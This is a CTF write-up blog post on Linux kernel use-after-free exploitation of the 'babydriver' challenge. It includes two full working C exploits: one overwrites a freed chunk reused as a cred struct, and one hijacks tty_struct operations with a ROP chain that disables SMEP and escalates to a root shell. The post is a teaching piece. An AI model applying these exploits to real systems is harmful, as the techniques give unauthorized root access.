---
title: "Introduction of Kernel Pwn: UAF"
date: 2022-05-18 17:52:21
tags: 
layout: default
---

# 0x00 Prologue
I only have little experience with kernel pwn. During the `Intro_to_OS` course, I read a lot of kernel code of `xv6` and learned the kernel systematically. Although `xv6` is a simple system while the `Linux` kernel is much more complex, the knowledge from `xv6` learned helps a lot.

This post would not go too deep into the kernel because I am too weak to do that and I got all the solution ideas from `CTF-wiki`. You can also download the attachments at this [link][1]

# 0x01 UAF

In kernel, we could also use `malloc` `kfree` to allocate and return kernel heap chunks. But the management mechanism is different from in user mode. I didn't know the `slab` mechanism at all. And I'll start with a simple challenge and go through the exploit script to demonstrate the steps in kernel UAF exploitation. You can get the attachments at this [repo][2]. I'll go through this and provide two different solutions. The first one is a simple one while the second one is more general.

# 0x02 Analysis

[attachment][3]

Let's start from the boot script, `start.sh`.
```sh
#!/bin/bash

qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm -monitor /dev/null -m 64M --nographic  -smp \
cores=1,threads=1 -cpu kvm64,+smep
```

This challenge runs with `smep`. But, in the first solution, we don't need to care about the mitigation. 
Then let's check the `init` script in the file system.

```sh
#!/bin/sh
 
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

It's also a script, there is nothing important in `init`. As we can see, we read the symbol address in `/proc/kallsyms` and use `dmesg` to debug.

After reviewing these scripts, we can start the reversing.

```c
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx

  _fentry__(filp, command, arg);
  v4 = v3;
  if ( command == 65537 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 37748928LL);
    return 0LL;
  }
  else
  {
    printk(&unk_2EB, v3);
    return -22LL;
  }
}
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n", filp);
  return 0;
}
```

The most important two functions are `babyioctl` and `babyrelease`. It's important to notice there is no synchronization in this device and the `babydev_struct` is a global variable. So we could trigger the UAF by the following code.
```sh
a = open()
b = open()
close(a)
# we still have b.
```

The solution:
- UAF to get new process's cred struct
- modify the uid to get the root

# 0x03 Solution I
0xa8 is the similar to sizeof(struct cred) and the new process's would fetch the free chunk to store cred info.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
typedef unsigned int uint;
void UAF()
{
    int f1 = open("/dev/babydev",2);
    int f2 = open("/dev/babydev",2);
    ioctl(f2,0x10001,0xa8); 
    close(f2);
    if(!fork())
    {   
        char buf[0x100]={0};
        write(f1,buf,28);
        system("/bin/sh");
    }
    wait(NULL);
}
int main()
{
    UAF();
}
```

# 0x04 Solution II 
This is a more general and useful solution, for kernel UAF pwn, `/dev/ptmx` is a good candidate to exploit because there is a cool element in `tty_stuct` named `const struct tty_operations *ops;`. You can find the source code of `tty_struct` at this [link][4] and `tty_operations` at this [link][5]. 

It's a struct about the function points.
```c
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    int  (*get_serial)(struct tty_struct *tty, struct serial_struct *p);
    int  (*set_serial)(struct tty_struct *tty, struct serial_struct *p);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(str
    
    uct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

We can modify it and use options such as `write(tty)` or `close(tty)` to trigger our gadgets.
The attacking procedure would be like
```c 
// UAF a 0x2e0 kernel chunk
int fd = open("\dev\ptmx")
// ... Modify the tty_struct.ops to control the the tty_struct.ops->write
write(fd,buf,1)
```

The full exploit script could use the address got while debugging because there is no kaslr. But there is `SMEP`, my exploit script bypasss the `SMEP` and perform `ret2usr` to get the shell.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
typedef unsigned int uint;

void panic(char *s)
{
    printf("[!] Panic:");
    puts(s);
    exit(1);
}
void shell(){
    if(!getuid())
    {
        system("/bin/sh");
    }
    else{
        puts("[!] NO ROOT");
    }
}
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}
uint64_t commit_cred  = 0xffffffff810a1420;
uint64_t prepare_kernel_cred =0xffffffff810a1810;

void get_root()
{
    uint64_t (* a)();
    a = prepare_kernel_cred;
    uint64_t (* b)();
    b = commit_cred;
    b(a(0));

}
void bypass_smep()
{
    save_status();
    int f1 = open("/dev/babydev",2);
    int f2 = open("/dev/babydev",2);
    ioctl(f1,0x10001,0x2e0);
    close(f1);
    f1 = open("/dev/ptmx",2| O_NOCTTY);
    size_t buf[0x100] = {0};
    size_t fake[0x100] = {0};
    size_t rop[0x100] = {0};
    fake[7] = 0xFFFFFFFF8181BFC5;
    fake[0] = 0xffffffff8100ce6e;
    fake[1] = rop;
    fake[2] = 0xFFFFFFFF8181BFC5;
    uint ct = 0 ;
    rop[ct++] = 0xffffffff810d238d;
    rop[ct++] = 0x6f0;
    rop[ct++] = 0xffffffff81004d80; //mov cr4, rdi; pop ; ret
    rop[ct++] = 0;
    rop[ct++] = get_root;
    rop[ct++] = 0xffffffff81063694; //swapgs; pop ; ret
    rop[ct++] = 0;
    rop[ct++] = 0xffffffff814e35ef; //iretq
    rop[ct++] = shell;
    rop[ct++] = user_cs;
    rop[ct++] = user_rflags;
    rop[ct++] = user_sp;
    rop[ct++] = user_ss;
    
    read(f2,buf,0x20);
    buf[3] = fake;
    write(f2,buf,0x20);

    char trash[0x20];
    write(f1,trash,0x20);
}
int main()
{
    bypass_smep();
}
```
# 0x05 Summary
The second solution(ptmx) is significant and it's a very general solution for kernel-heap exploitation. 


[1]: https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel
[2]: https://github.com/n132/attachment
[3]: https://github.com/n132/attachment/tree/main/CISCN_2017
[4]: https://code.woboq.org/linux/linux/include/linux/tty.h.html#tty_struct
[5]: https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations